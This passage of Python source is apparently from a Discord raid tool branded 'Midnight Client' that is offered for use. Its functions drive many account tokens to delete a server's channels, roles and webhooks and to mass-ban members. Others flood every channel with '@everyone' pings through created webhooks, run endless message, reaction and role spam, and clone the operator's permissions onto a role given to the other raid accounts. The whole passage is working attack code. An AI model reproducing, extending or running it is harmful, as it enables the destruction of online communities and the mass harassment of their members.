            f"[🗑️] Starting message purge in channel {channel_id} (before message {command_message_id}).")
        if delete_all_users:
            self.update_signal.emit(
                "[⚠️] NOTE: User accounts can only delete their OWN messages. This will skip messages from others.")

        messages_to_delete = []
        last_message_id = command_message_id

        while self.running:
            endpoint = f"{self.base_url}/channels/{channel_id}/messages?limit=100&before={last_message_id}"
            r = self.make_request("GET", endpoint, self.get_next_token())

            if not r or r.status_code != 200:
                self.update_signal.emit("[❌] Failed to fetch a chunk of messages. Stopping purge.")
                break

            chunk = r.json()
            if not chunk:
                self.update_signal.emit("[✅] Reached the beginning of the channel history.")
                break

            found_own = 0
            for message in chunk:
                if message['author']['id'] == self.user_id:
                    messages_to_delete.append(message['id'])
                    found_own += 1

            last_message_id = chunk[-1]['id']
            self.update_signal.emit(
                f"[🔍] Fetched {len(chunk)} messages, found {found_own} of yours to add to the delete queue ({len(messages_to_delete)} total).")
            time.sleep(0.5)

        if not messages_to_delete:
            self.update_signal.emit("[✅] No messages of yours were found before the command.")
            return

        self.update_signal.emit(
            f"[💥] Starting deletion of {len(messages_to_delete)} messages. This will take a while...")

        success_count = 0
        total_messages = len(messages_to_delete)

        for i, message_id in enumerate(messages_to_delete):
            if not self.running:
                self.update_signal.emit("[🛑] Message deletion stopped by user.")
                break

            if self.delete_message(self.get_next_token(), channel_id, message_id):
                success_count += 1

            self.progress_signal.emit(int(((i + 1) / total_messages) * 100), f"Deleting {i + 1}/{total_messages}")
            time.sleep(delay)

        self.update_signal.emit(f"[✅] Purge complete. Successfully deleted: {success_count}/{total_messages} messages.")

    def run_delete_messages(self):
        self._run_purge_logic(delete_all_users=False)

    def run_delete_all_messages(self):
        self._run_purge_logic(delete_all_users=True)

    def run_send_multiple_messages(self):
        if not self.running: return

        channel_id = getattr(self, 'channel_id', None)
        message = getattr(self, 'message', 'Default message')
        count = getattr(self, 'message_count', 1)
        delay = getattr(self, 'message_delay', 1.0)

        if not channel_id:
            self.update_signal.emit("[❌] No Channel ID specified for sending messages.")
            return

        self.update_signal.emit(
            f"[📨] Sending '{message}' {count} times to channel {channel_id} with a {delay:.2f}s delay...")

        for i in range(count):
            if not self.running:
                self.update_signal.emit("[🛑] Message sending stopped by user.")
                break

            success = self.send_specific_message(self.get_next_token(), channel_id, message)
            if success:
                self.update_signal.emit(f"  -> Sent message {i + 1}/{count}")
            else:
                self.update_signal.emit(f"  -> Failed to send message {i + 1}/{count}")

            if i < count - 1:
                time.sleep(delay)

        self.update_signal.emit("[✅] Finished sending messages.")

    def run_webhook_pinger(self, executor, scan_token):
        if not self.running: return
        server_id = getattr(self, 'server_id', None)
        if not server_id: return
        self.update_signal.emit("[🪝] Initiating webhook ping spam...")

        r = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/channels", scan_token)
        if not r or r.status_code != 200:
            self.update_signal.emit("[❌] Failed to fetch channels for webhook pinging!")
            return

        channels = [c['id'] for c in r.json() if c['type'] == 0]
        if not channels:
            self.update_signal.emit("[⚠️] No text channels found for webhook pinging!")
            return

        webhooks = []
        self.update_signal.emit(f"[⚡] Creating webhooks in {len(channels)} channels...")
        webhook_futures = [executor.submit(self.create_webhook, self.get_next_token(), channel, "MIDNIGHT-PINGER") for
                           channel in channels]
        for future in as_completed(webhook_futures):
            if not self.running: break
            webhook_url = future.result()
            if webhook_url:
                webhooks.append(webhook_url)

        if not webhooks:
            self.update_signal.emit("[❌] Failed to create any webhooks for pinging!")
            return

        ping_message = self._get_message_content().strip() or "@everyone @here Nuked by Midnight Client"
        post_nuke_spam_count = getattr(self, 'post_nuke_spam_count', 5)
        self.update_signal.emit(
            f"[💬] Spamming pings to {len(webhooks)} webhooks ({post_nuke_spam_count} times each)...")
        for i in range(post_nuke_spam_count):
            if not self.running: break
            self.update_signal.emit(f"--> Ping Wave {i + 1}/{post_nuke_spam_count}")
            spam_futures = [executor.submit(self.send_webhook_message, webhook, ping_message) for webhook in webhooks]
            for _ in as_completed(spam_futures):
                if not self.running: break
            time.sleep(0.5)

        self.update_signal.emit("[✅] Webhook pinging complete.")

    def run_give_best_role_to_tokens(self):
        """
        Standalone action to create a role with the primary token's permissions
        and assign it to all other tokens in the list.
        """
        if not self.running: return

        if len(self.tokens) < 2:
            self.update_signal.emit("[ℹ️] This action requires at least two tokens loaded to have an effect.")
            return

        server_id = getattr(self, 'server_id', None)
        if not server_id:
            self.update_signal.emit("[❌] Cannot give role: No Server ID was provided in the command context.")
            return

        with ThreadPoolExecutor(max_workers=20) as executor:
            self.update_signal.emit("[✨] Scanning your roles to create a permission clone...")
            scan_token = self.tokens[0]

            r_all_roles = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/roles", scan_token)
            if not r_all_roles or r_all_roles.status_code != 200:
                self.update_signal.emit("[❌] Could not fetch server roles to calculate permissions. Aborting.")
                return
            all_roles = r_all_roles.json()

            my_user_id = None
            r_user = self.make_request("GET", f"{self.base_url}/users/@me", scan_token)
            if r_user and r_user.status_code == 200:
                my_user_id = r_user.json()['id']

            my_total_permissions = 0
            my_highest_position = 0

            if my_user_id:
                r_member = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/members/{my_user_id}",
                                             scan_token)
                if r_member and r_member.status_code == 200:
                    my_role_ids = set(r_member.json().get('roles', []))
                    user_roles = [role for role in all_roles if role['id'] in my_role_ids]
                    if user_roles:
                        for role in user_roles:
                            my_total_permissions |= int(role['permissions'])
                        my_highest_position = max(role['position'] for role in user_roles)
                        self.update_signal.emit(
                            f"[⚙️] Scanned and cloned your permissions. Value: {my_total_permissions}")
                    else:
                        self.update_signal.emit(
                            "[⚠️] You have no roles; the new role will be created with no permissions.")
                else:
                    self.update_signal.emit("[⚠️] Could not fetch your member info to scan permissions.")
            else:
                self.update_signal.emit("[⚠️] Could not fetch your user ID to scan permissions.")

            role_name = "Member"
            role_color = random.randint(0, 0xFFFFFF)
            payload = {"name": role_name, "color": role_color, "permissions": str(my_total_permissions), "hoist": True,
                       "mentionable": True}
            r_create = self.make_request("POST", f"{self.base_url}/guilds/{server_id}/roles", scan_token,
                                         payload=payload)

            if not r_create or r_create.status_code != 200:
                error_message = f" (Status: {r_create.status_code}, Response: {r_create.text[:100]})" if r_create is not None else ""
                self.update_signal.emit(f"[❌] Failed to create the '{role_name}' role{error_message}. Aborting.")
                return

            new_role = r_create.json()
            new_role_id = new_role['id']
            self.protected_role_id = new_role_id
            self.update_signal.emit(f"[✅] Created role '{role_name}' with your cloned permissions.")

            if my_highest_position > 0:
                move_payload = [{"id": new_role_id, "position": my_highest_position}]
                r_move = self.make_request("PATCH", f"{self.base_url}/guilds/{server_id}/roles", scan_token,
                                           payload=move_payload)
                if r_move and r_move.status_code == 200:
                    self.update_signal.emit(f"[✅] Moved role '{role_name}' to be just below your highest role.")
                else:
                    self.update_signal.emit(f"[⚠️] Failed to automatically move the new role.")
            else:
                self.update_signal.emit("[⚠️] Could not determine your highest role to position the new role.")

            other_tokens = self.tokens[1:]
            user_ids_to_add_role = []
            for token in other_tokens:
                if not self.running: break
                r_user_other = self.make_request("GET", f"{self.base_url}/users/@me", token)
                if r_user_other and r_user_other.status_code == 200:
                    user_ids_to_add_role.append(r_user_other.json()['id'])

            if not user_ids_to_add_role:
                self.update_signal.emit("[ℹ️] Could not get user info for other tokens. No roles assigned.")
                return

            self.update_signal.emit(
                f"[✨] Giving role '{role_name}' to {len(user_ids_to_add_role)} other token accounts...")

            def add_role_to_user(user_id):
                endpoint = f"{self.base_url}/guilds/{server_id}/members/{user_id}/roles/{new_role_id}"
                # The primary token (scan_token) gives the role to the other users
                r = self.make_request("PUT", endpoint, scan_token)
                if r and r.status_code == 204:
                    self.update_signal.emit(f"[✅] Successfully gave role to user {user_id}")
                else:
                    self.update_signal.emit(
                        f"[❌] Failed to give role to user {user_id}. They might not be in the server.")

            futures = [executor.submit(add_role_to_user, uid) for uid in user_ids_to_add_role]
            for _ in as_completed(futures):
                if not self.running: break

            self.update_signal.emit(f"[✅] Finished assigning roles.")

    def _ban_all_members(self, executor):
        if not self.running: return
        server_id = getattr(self, 'server_id', None)
        if not server_id:
            self.update_signal.emit("[❌] Mass ban failed: No Server ID provided.")
            return

        self.update_signal.emit("[⚖️] Checking ban or admin permissions...")
        scan_token = self.tokens[0]
        r_user = self.make_request("GET", f"{self.base_url}/users/@me", scan_token)
        if not r_user or r_user.status_code != 200:
            self.update_signal.emit("[❌] Could not verify primary token to check permissions. Aborting ban.")
            return

        my_user_id = r_user.json()['id']
        r_member = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/members/{my_user_id}", scan_token)
        if not r_member or r_member.status_code != 200:
            self.update_signal.emit(
                f"[❌] Could not fetch your member info for server {server_id}. Are you in the server?")
            return

        my_role_ids = set(r_member.json().get('roles', []))
        my_role_ids.add(server_id)  # Add @everyone role which has the guild_id as its id

        r_all_roles = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/roles", scan_token)
        if not r_all_roles or r_all_roles.status_code != 200:
            self.update_signal.emit("[❌] Could not fetch server roles to check permissions. Aborting ban.")
            return

        all_roles_map = {role['id']: role for role in r_all_roles.json()}
        my_permissions = 0
        for role_id in my_role_ids:
            if role_id in all_roles_map:
                my_permissions |= int(all_roles_map[role_id]['permissions'])

        # Administrator permission is 0x8, Ban Members is 0x4
        has_admin_perm = (my_permissions & 0x8) == 0x8
        has_ban_perm = (my_permissions & 0x4) == 0x4

        if not (has_admin_perm or has_ban_perm):
            self.update_signal.emit(
                "[❌] BAN ALL FAILED: You do not have 'Administrator' or 'Ban Members' permission in this server.")
            return

        if has_admin_perm:
            self.update_signal.emit("[✅] Administrator permission confirmed.")
        else:
            self.update_signal.emit("[✅] Ban Members permission confirmed.")

        ids_to_ban = set()
        # FIX: Get the pre-loaded IDs from the bot's own attributes, not the GUI.
        pre_loaded_ids = getattr(self, 'ban_user_ids_from_file', [])

        if pre_loaded_ids:
            self.update_signal.emit(f"[ℹ️] Using pre-loaded list of {len(pre_loaded_ids)} members for the ban.")
            ids_to_ban = set(pre_loaded_ids)
        else:
            self.update_signal.emit("[💣] No pre-loaded list found. Initiating live scan for members...")
            all_member_data = self.fetch_members_via_chunks(delay=0.1)
            if not all_member_data or not self.running:
                self.update_signal.emit("[❌] Live scan failed to fetch members. Aborting ban all.")
                return
            ids_to_ban = {member['id'] for member in all_member_data}

        token_user_ids = set()
        self.update_signal.emit(f"[🛡️] Identifying all {len(self.tokens)} token accounts to prevent self-banning...")
        for token in self.tokens:
            if not self.running: break
            r_user_check = self.make_request("GET", f"{self.base_url}/users/@me", token)
            if r_user_check and r_user_check.status_code == 200:
                user_id_to_exclude = r_user_check.json()['id']
                token_user_ids.add(user_id_to_exclude)

        original_ban_count = len(ids_to_ban)
        ids_to_ban.difference_update(token_user_ids)
        excluded_count = original_ban_count - len(ids_to_ban)
        if excluded_count > 0:
            self.update_signal.emit(f"[ℹ️] Excluded {excluded_count} token account(s) from the mass ban.")

        if not ids_to_ban:
            self.update_signal.emit("[✅] No members found to ban after exclusions.")
            return

        self.update_signal.emit(f"[🔨] Preparing to ban {len(ids_to_ban)} members...")
        banned_count = 0
        total_to_ban = len(ids_to_ban)
        ban_futures = {executor.submit(self.ban_member, self.get_next_token(), member_id): member_id for member_id in
                       ids_to_ban}

        for i, future in enumerate(as_completed(ban_futures)):
            if not self.running: break
            if future.result():
                banned_count += 1
            self.progress_signal.emit(int(((i + 1) / total_to_ban) * 100),
                                      f"Banning {banned_count}/{total_to_ban}")

        self.update_signal.emit(f"[✅] Mass ban complete. Banned {banned_count}/{total_to_ban} members.")
    def run_ping_all(self):
        if not self.running: return

        channel_id = getattr(self, 'channel_id', None)

        # FIX: Get the ping IDs from the bot's own attributes, not the GUI.
        ping_ids = getattr(self, 'ping_user_ids', [])

        pings_per_batch = getattr(self, 'pings_per_batch', 2)
        pings_per_second_limit = getattr(self, 'pings_per_second_limit', 10)

        if not channel_id:
            self.update_signal.emit("[❌] Ping All failed: No Channel ID specified.")
            return
        if not ping_ids:
            self.update_signal.emit("[⚠️] Ping All called with no users to ping (Member log might be empty).")
            return

        try:
            effective_rate = max(1, pings_per_second_limit)
            delay_between_batches = 1.0 / effective_rate
        except (ZeroDivisionError, TypeError):
            delay_between_batches = 0.1 

        effective_pings_per_batch = max(1, pings_per_batch)

        self.update_signal.emit(
            f"[📨] Preparing to ping {len(ping_ids)} members in channel {channel_id} with {effective_pings_per_batch} pings/message...")
        self.update_signal.emit(f"   -> Rate: {effective_rate} batches/sec ({delay_between_batches:.2f}s delay)")

        messages_to_send = []
        current_batch = []
        for user_id in ping_ids:
            ping = f"<@{user_id}> "
            if len(" ".join(current_batch) + ping) > 1900 or len(
                    current_batch) >= effective_pings_per_batch:
                messages_to_send.append(" ".join(current_batch))
                current_batch = [ping]
            else:
                current_batch.append(ping)

        if current_batch:
            messages_to_send.append(" ".join(current_batch))

        self.update_signal.emit(f"[📨] Sending {len(messages_to_send)} batch messages to ping users.")

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for i, msg in enumerate(messages_to_send):
                if not self.running:
                    self.update_signal.emit("[🛑] Ping All stopped by user during batch preparation.")
                    break
                
                future = executor.submit(self.send_specific_message, self.get_next_token(), channel_id, msg)
                futures.append(future)

                self.progress_signal.emit(int(((i + 1) / len(messages_to_send)) * 100),
                                          f"Sending batch {i + 1}/{len(messages_to_send)}")

                if i < len(messages_to_send) - 1:
                    time.sleep(delay_between_batches)

            success_count = 0
            for future in as_completed(futures):
                if future.result():
                    success_count += 1

        self.update_signal.emit(
            f"[✅] Ping All complete. Sent {success_count}/{len(messages_to_send)} batches successfully.")





    def _get_message_content(self):
        """Gets a message, either randomly from a list or the full text."""
        messages = getattr(self, 'messages', [])
        use_random = getattr(self, 'random_messages', False)

        if not messages:
            # Fallback to the old single message attribute if 'messages' list is empty
            # This ensures webhook spamming and other functions that use 'message' still work
            return getattr(self, 'message', "\u200b")

        if use_random:
            return random.choice(messages)
        else:
            return '\n'.join(messages)
        



    def send_message(self, token, channel_id):
        if not self.running: return False
        
        # This now gets a message using our new logic
        msg_content = self._get_message_content()
        if not msg_content.strip():
            msg_content = "\u200b"

        payload = {"content": msg_content}
        r = self.make_request("POST",
                              f"{self.base_url}/channels/{channel_id}/messages",
                              token, payload)
        if r and r.status_code == 200:
            return True
        return False

    def run_nuke(self):
        if not self.running: return
        server_id = getattr(self, 'server_id', None)
        if not server_id:
            self.update_signal.emit("[❌] Nuke failed: No Server ID provided.")
            return

        self.update_signal.emit(f"[💣] INITIATING ANNIHILATION WITH {len(self.tokens)} TOKENS ON {server_id}")
        scan_token = self.get_next_token()

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            destruction_options = getattr(self, 'destruction_options', {})

            if destruction_options.get("give_all_other_tokens_best_role"):
                self._give_best_role_to_tokens(executor)

            if destruction_options.get("delete_channels"):
                self.update_signal.emit("[💥] Fetching all channels for deletion...")
                r_channels = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/channels", scan_token)
                
                if not r_channels or r_channels.status_code != 200:
                    self.update_signal.emit("[❌] Could not fetch channels. Skipping channel deletion.")
                else:
                    channels_to_delete = [c['id'] for c in r_channels.json()]
                    if not channels_to_delete:
                        self.update_signal.emit("[✅] No channels found to delete.")
                    else:
                        self.update_signal.emit(f"[💥] Deleting {len(channels_to_delete)} channels...")
                        # Submit all deletion tasks to the executor. The bot will not get stuck on failures.
                        futures = [executor.submit(self.delete_channel, self.get_next_token(), channel_id) for channel_id in channels_to_delete]
                        
                        # Wait for all tasks to complete. Failures are handled and logged by the worker function.
                        for future in as_completed(futures):
                            if not self.running:
                                self.update_signal.emit("[🛑] Channel deletion stopped by user.")
                                break
                        
                        if self.running:
                            self.update_signal.emit("[✅] Finished channel deletion attempts.")
            
            self.channel_cache = [] 

            r_roles = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/roles", scan_token)
            roles_to_delete = [role['id'] for role in r_roles.json() if role['id'] != server_id and role['id'] != self.protected_role_id] if r_roles and r_roles.status_code == 200 else []
            if destruction_options.get("delete_roles") and roles_to_delete and self.running:
                self.update_signal.emit(f"[💀] Deleting {len(roles_to_delete)} roles...")
                futures = [executor.submit(self.delete_role, self.get_next_token(), role) for role in roles_to_delete]
                for _ in as_completed(futures): pass


            if self.running: time.sleep(1.0) # Let API cool down before creation

            r_webhooks = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/webhooks", scan_token)
            webhooks_to_delete = [wh['id'] for wh in r_webhooks.json()] if r_webhooks and r_webhooks.status_code == 200 else []
            if destruction_options.get("delete_webhooks") and webhooks_to_delete and self.running:
                self.update_signal.emit(f"[🔥] Deleting {len(webhooks_to_delete)} webhooks...")
                futures = [executor.submit(self.delete_webhook, self.get_next_token(), webhook) for webhook in webhooks_to_delete]
                for _ in as_completed(futures): pass

            if (destruction_options.get("rename_server") or getattr(self, 'server_pfp_path', None)) and self.running:
                self.update_server_details(self.get_next_token())


            if destruction_options.get("ban_all_enabled", False) and self.running:
                def ban_worker():
                    self.update_signal.emit("[🚀] Background ban task has been started.")
                    self._ban_all_members(executor)
                    self.update_signal.emit("[✅] Background ban task has completed.")
                executor.submit(ban_worker)
            newly_created_channels = []
            custom_channel_name = getattr(self, 'custom_channel_name', '').strip()
            channel_name = custom_channel_name if custom_channel_name else (self._get_message_content() or 'midnight-raid')

            channel_creation_futures = []
            if destruction_options.get("create_6_channels") and self.running:
                self.update_signal.emit(f"[+] Creating 6 channels named '{channel_name}-...'")
                for i in range(6):
                    channel_creation_futures.append(executor.submit(self.create_channel, self.get_next_token(), f"{channel_name}-{i}"))

            if destruction_options.get("create_spam") and self.running:
                duration = getattr(self, 'channel_creation_duration', 10)
                self.update_signal.emit(f"[+] Creating spam channels named '{channel_name}-...' for {duration} seconds...")
                start_time = time.time()
                while self.running and (time.time() - start_time) < duration:
                    channel_creation_futures.append(executor.submit(self.create_channel, self.get_next_token(), f"{channel_name}-{random.randint(100, 9999)}"))
                    time.sleep(0.05)
            
            for future in as_completed(channel_creation_futures):
                if not self.running: break
                new_id = future.result()
                if new_id: newly_created_channels.append(new_id)

            if not self.running:
                self.update_signal.emit("[🛑] Nuke stopped during channel creation.")
                return

            if destruction_options.get("use_webhook_ping") and self.running:
                self.run_webhook_pinger(executor, scan_token)

            if destruction_options.get("spam_all_channels_post_nuke") and self.running:
                channels_to_spam = newly_created_channels
                if not channels_to_spam:
                    r = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/channels", scan_token)
                    if r and r.status_code == 200:
                        channels_to_spam = [c['id'] for c in r.json() if c['type'] == 0]
                
                if channels_to_spam:
                    spam_count = getattr(self, 'post_nuke_spam_count', 5)
                    self.update_signal.emit(f"[💬] Spamming {len(channels_to_spam)} channels ({spam_count} times each)...")
                    for i in range(spam_count):
                        if not self.running: break
                        self.update_signal.emit(f"--> Spam Wave {i + 1}/{spam_count}")
                        spam_message = self._get_message_content() or "Nuked by Midnight Client"
                        spam_futures = [executor.submit(self.send_specific_message, self.get_next_token(), channel_id, spam_message) for channel_id in channels_to_spam]
                        for _ in as_completed(spam_futures):
                            if not self.running: break

        self.update_signal.emit("[💀] SERVER ANNIHILATION COMPLETE (Ban task may still be running in the background if enabled)")

    def run_create_channels(self):
        if not self.running: return

        duration = getattr(self, 'channel_creation_duration', 10)
        channel_name_template = getattr(self, 'channel_name', 'midnight-raid')

        self.update_signal.emit(f"[⚡] Creating channels named '{channel_name_template}-...' for {duration} seconds...")

        start_time = time.time()
        created_count = 0

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while self.running and (time.time() - start_time) < duration:
                futures = [executor.submit(self.create_channel, self.get_next_token(),
                                           f"{channel_name_template}-{random.randint(100, 9999)}") for _ in range(10)]

                for future in as_completed(futures):
                    if not self.running: break
                    if future.result():
                        created_count += 1

                if not self.running: break

        self.update_signal.emit(f"[✅] Channel creation complete. Created {created_count} channels.")
    def run_nuclear(self):
        if not self.running: return
        server_id = getattr(self, 'server_id', None)
        if not server_id: return
        self.update_signal.emit(f"[☢️] NUCLEAR MODE ACTIVATED WITH {len(self.tokens)} TOKENS")
        token = self.get_next_token()
        r = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/channels", token)
        if not r or r.status_code != 200:
            self.update_signal.emit("[❌] Failed to fetch channels! Cannot proceed with Nuclear Mode.")
            return

        channels = [c['id'] for c in r.json()]
        if not channels:
            self.update_signal.emit("[⚠️] No channels found to spam in Nuclear Mode!")
            return

        message_counter = 0
        target_messages = getattr(self, 'nuclear_message_count', 100)
        is_infinite = getattr(self, 'destruction_options', {}).get("infinite_loop", False)
        if is_infinite:
            target_messages = -1

        self.update_signal.emit(f"[☢️] Spamming {len(channels)} channels...")

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while self.running and (target_messages == -1 or message_counter < target_messages):
                futures = [executor.submit(self.send_message, self.get_next_token(), channel) for channel in channels]
                for _ in as_completed(futures):
                    if not self.running: break
                message_counter += 1
                self.progress_signal.emit(message_counter, "Nuclear Mode Iteration")
                self.conditional_sleep(0.05)

        self.update_signal.emit("[💀] NUCLEAR MODE COMPLETE")

    def run_turbo(self):
        if not self.running: return

        target_channel = getattr(self, 'channel_id', None)
        messages_per_second = getattr(self, 'turbo_delay', 20)

        if not target_channel:
            self.update_signal.emit("[❌] Turbo Mode failed: No channel_id was provided.")
            return

        try:
            actual_delay = 1.0 / messages_per_second
            delay_str = f"{messages_per_second} msg/s"
        except (ZeroDivisionError, TypeError):
            actual_delay = 0
            delay_str = "max speed"

        self.update_signal.emit(f"[🌀] TURBO MODE ACTIVATED (Channel: {target_channel}, Rate: {delay_str})")

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while self.running:
                token = self.get_next_token()
                executor.submit(self.send_message, token, target_channel)
                if actual_delay > 0:
                    time.sleep(actual_delay)

        self.update_signal.emit("[💀] TURBO MODE COMPLETE")

    def run_reaction_spammer(self):
        if not self.running: return

        channel_id = self.options.get('channel_id') or self.options.get('reaction_channel_id')
        message_id = self.options.get('replied_message_id') or self.options.get('reaction_message_id')

        if not channel_id or not message_id:
            self.update_signal.emit(
                "[❌] Reaction Spammer failed: Channel ID and Message ID are required. "
                "(Hint: For commands, reply to a message. For GUI, fill the fields in the Troll tab).")
            return

        self.update_signal.emit(
            f"[❤️] REACTION SPAMMER ACTIVATED (Channel: {channel_id}, Message: {message_id})")

        with ThreadPoolExecutor(max_workers=200) as executor:
            while self.running:
                futures = [executor.submit(
                    self.add_reaction,
                    self.get_next_token(),
                    channel_id,
                    message_id,
                    random.choice(self.standard_emojis)
                ) for _ in range(100)]

                for future in as_completed(futures):
                    if not self.running: break
                    future.result()

                if not self.running: break
                time.sleep(0.05)

        self.update_signal.emit("[💀] REACTION SPAMMER COMPLETE")

    def run_status_changer(self):
        if not self.running: return

        status_texts = getattr(self, 'status_texts', [])
        status_delay = getattr(self, 'status_delay', 5)
        use_presence_cycle = getattr(self, 'cycle_presence', False)
        presence_list = getattr(self, 'presence_list', [])
        presence_delay = getattr(self, 'presence_delay', 5)

        text_mode_active = bool(status_texts)
        presence_mode_active = use_presence_cycle and bool(presence_list)

        if not text_mode_active and not presence_mode_active:
            self.update_signal.emit("[❌] No status texts or presence options are configured. Stopping.")
            return

        self.update_signal.emit(
            f"[🚀] STATUS CHANGER ACTIVATED (Text: {text_mode_active}, Presence: {presence_mode_active})")
        if getattr(self, 'status_emoji_server_id', None):
            self.update_signal.emit(
                f"[INFO] Using Server ID {getattr(self, 'status_emoji_server_id')} for emoji lookup.")


        current_text = status_texts[0] if text_mode_active else None
        current_presence = presence_list[0] if presence_mode_active else None


        if self.running and (current_text or current_presence):
            self.update_signal.emit(f"[✨] Setting initial status...")
            for token in self.tokens:
                self.change_status(token, text=current_text, presence=current_presence)

        text_iterator = 1  # Start at 1 since we used the 0th element for the initial state
        presence_iterator = 1
        next_text_update_time = time.time() + status_delay
        next_presence_update_time = time.time() + presence_delay

        with ThreadPoolExecutor(max_workers=len(self.tokens)) as executor:
            while self.running:
                current_time = time.time()
                needs_update = False

                # Check if it's time to update the text status
                if text_mode_active and current_time >= next_text_update_time:
                    current_text = status_texts[text_iterator % len(status_texts)]
                    text_iterator += 1
                    next_text_update_time = current_time + status_delay
                    needs_update = True

                # Check if it's time to update the presence
                if presence_mode_active and current_time >= next_presence_update_time:
                    current_presence = presence_list[presence_iterator % len(presence_list)]
                    presence_iterator += 1
                    next_presence_update_time = current_time + presence_delay
                    needs_update = True

                # If an update is needed, send the full current state
                if needs_update:
                    log_parts = []
                    if text_mode_active: log_parts.append(f"Text: '{current_text}'")
                    if presence_mode_active: log_parts.append(f"Presence: {current_presence.upper()}")
                    self.update_signal.emit(f"[✨] Updating status -> {', '.join(log_parts)}")

                    # Send the complete, current status object to all tokens
                    futures = [executor.submit(self.change_status, token, text=current_text, presence=current_presence)
                               for token in self.tokens]
                    for future in as_completed(futures):
                        if not self.running: break
                        future.result()

                # Main loop sleep to prevent high CPU usage
                if self.running:
                    time.sleep(0.1)

        self.update_signal.emit("[💀] STATUS CHANGER DEACTIVATED")

    def run_role_spammer(self):
        if not self.running: return
        server_id = getattr(self, 'server_id', None)
        if not server_id: return

        role_name_template = getattr(self, 'role_name', 'SPAM')
        self.update_signal.emit(f"[🎨] ROLE SPAMMER ACTIVATED (Server: {server_id})")

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while self.running:
                futures = []
                for i in range(10):
                    if not self.running:
                        break
                    role_name = f"{role_name_template}-{random.randint(1000, 9999)}"
                    futures.append(executor.submit(
                        self.create_role,
                        self.get_next_token(),
                        role_name,
                        random.randint(0, 0xFFFFFF)
                    ))

                for future in as_completed(futures):
                    if not self.running:
                        break
                    future.result()

                if not self.running:
                    break
                time.sleep(0.5)

        self.update_signal.emit("[💀] ROLE SPAMMER COMPLETE")

    def run_webhook_spam_existing(self):
        if not self.running: return
        server_id = getattr(self, 'server_id', None)
        if not server_id: return
        self.update_signal.emit(f"[🪝] SPAMMING EXISTING WEBHOOKS (Server: {server_id})")

        scan_token = self.get_next_token()
        r = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/webhooks", scan_token)
        if not r or r.status_code != 200:
            self.update_signal.emit("[❌] Failed to fetch existing webhooks for the server!")
            return

        all_webhooks = [wh['url'] for wh in r.json()]
        if not all_webhooks:
            self.update_signal.emit("[⚠️] No existing webhooks found on this server!")
            return

        self.update_signal.emit(f"[✅] Found {len(all_webhooks)} existing webhooks. Starting spam...")

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:

            dedicated_msg = getattr(self, 'webhook_message', '').strip()
            if dedicated_msg:
                msg_content = dedicated_msg
            else:
                msg_content = self._get_message_content()

            if not msg_content.strip():
                msg_content = "Midnight" 


            wave_count = 0
            while self.running:
                wave_count += 1
                self.update_signal.emit(f"--> Firing spam wave {wave_count} from {len(all_webhooks)} webhooks")
                spam_tasks = [executor.submit(self.send_webhook_message, url, msg_content) for url in all_webhooks]
                for _ in as_completed(spam_tasks):
                    if not self.running: break
                if not self.running: break

        self.update_signal.emit("[💀] EXISTING WEBHOOK SPAM COMPLETE")


    def run_webhook_creator(self):
        if not self.running: return
        server_id = getattr(self, 'server_id', None)
        if not server_id: return
        webhook_count = getattr(self, 'webhook_spam_count', 10)
        self.update_signal.emit(f"[🪝] WEBHOOK CREATOR ACTIVATED (Server: {server_id})")

        channels = []
        command_channel_id = self.options.get('channel_id')
        if command_channel_id:
            self.update_signal.emit(f"[🎯] Targeting channel from command context: {command_channel_id}")
            channels = [command_channel_id]
        elif getattr(self, 'webhook_single_channel_mode', False) and getattr(self, 'webhook_target_channel_id', None):
            target_id = getattr(self, 'webhook_target_channel_id')
            self.update_signal.emit(f"[🎯] Targeting single channel from GUI setting: {target_id}")
            channels = [target_id]
        else:
            self.update_signal.emit(f"[🎯] Targeting all text channels on the server.")
            scan_token = self.get_next_token()
            r = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/channels", scan_token)
            if not r or r.status_code != 200:
                self.update_signal.emit("[❌] Failed to fetch channels for webhook creation!")
                return
            channels = [c['id'] for c in r.json() if c['type'] == 0]

        if not channels:
            self.update_signal.emit("[⚠️] No channels to target for webhook creation!")
            return

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            self.update_signal.emit(
                f"[⚡] Creating {webhook_count} webhooks in each of the {len(channels)} channels...")
            creation_tasks = []
            for channel_id in channels:
                for i in range(webhook_count):
                    task = executor.submit(self.create_webhook, self.get_next_token(), channel_id,
                                           f"midnight-created-{i}")
                    creation_tasks.append(task)

            success_count = 0
            for future in as_completed(creation_tasks):
                if not self.running: break
                if future.result():
                    success_count += 1

            self.update_signal.emit(f"[✅] WEBHOOK CREATION COMPLETE. Successfully created {success_count} webhooks.")

    def run_webhook_spammer(self):
        if not self.running: return
        server_id = getattr(self, 'server_id', None)
        if not server_id: return
        webhook_count = getattr(self, 'webhook_spam_count', 10)
        self.update_signal.emit(f"[🪝] WEBHOOK SPAMMER ACTIVATED (Server: {server_id})")

        channels = []
        command_channel_id = self.options.get('channel_id')
        if command_channel_id:
            self.update_signal.emit(f"[🎯] Targeting channel from command context: {command_channel_id}")
            channels = [command_channel_id]
        elif getattr(self, 'webhook_single_channel_mode', False) and getattr(self, 'webhook_target_channel_id', None):
            target_id = getattr(self, 'webhook_target_channel_id')
            self.update_signal.emit(f"[🎯] Targeting single channel from GUI setting: {target_id}")
            channels = [target_id]
        else:
            self.update_signal.emit(f"[🎯] Targeting all text channels on the server.")
            scan_token = self.get_next_token()
            r = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/channels", scan_token)
            if not r or r.status_code != 200:
                self.update_signal.emit("[❌] Failed to fetch channels for webhook spam!")
                return
